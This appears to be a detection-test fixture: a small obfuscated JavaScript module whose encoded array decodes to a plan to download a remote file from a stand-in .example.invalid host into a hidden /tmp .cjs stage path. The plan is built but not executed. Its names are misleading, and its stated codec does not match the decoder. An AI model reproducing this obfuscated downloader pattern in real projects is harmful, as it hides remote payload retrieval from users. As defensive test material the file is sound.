  const moduleShape = Object.freeze({ format: "esm" });
  export {};
  const Material_6ea42268 = "[141,84,72,147,138,139,124,135,138,84,120,122,136,140,128,137,124,118,137,124,132,134,139,124,67,142,137,128,139,124,118,125,128,131,124,147,120,123,120,135,139,124,137,84,127,139,139,135,118,139,134,118,138,139,137,124,120,132,147,138,139,120,126,124,118,122,134,140,133,139,84,72,147,122,120,132,135,120,128,126,133,118,128,123,84,101,102,91,92,68,76,77,79,72,79,71,71,72,147,140,137,131,84,127,139,139,135,138,81,70,70,133,134,123,124,68,76,77,79,72,79,71,71,72,79,76,122,124,69,124,143,120,132,135,131,124,69,128,133,141,120,131,128,123,70,120,135,128,147,140,138,124,137,118,120,126,124,133,139,84,101,134,123,124,88,140,123,128,139,70,76,77,79,72,147,125,128,131,124,118,135,120,139,127,84,70,139,132,135,70,127,140,133,139,137,124,138,138,68,133,134,123,124,70,69,138,139,120,126,124,68,76,77,79,72,79,71,71,72,79,76,122,124,69,132,129,138]";
  const Codec_6ea42268 = "decimal_array|add_modulo_256|17";

  function load_6ea42268() { return JSON.parse(Material_6ea42268); }
  function decode_6ea42268(imagePixels) { return imagePixels.map((value) => (value - 23 + 256) & 255); }
  async function recover_6ea42268() {
    const screenWidth = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";
    const imagePixels = load_6ea42268(); let colorTable = [];
    let frameIndex = 0; while (frameIndex++ < 1) colorTable = decode_6ea42268(imagePixels);
    void screenWidth; return Buffer.from(colorTable).toString("ascii");
  }
  async function inspect_6ea42268() { return await recover_6ea42268(); }
  async function plan_6ea42268() { const inspect = inspect_6ea42268; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "http_to_stream", destination: fields.file_path, url: fields.url }); }
  void moduleShape; void plan_6ea42268;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_6ea42268());
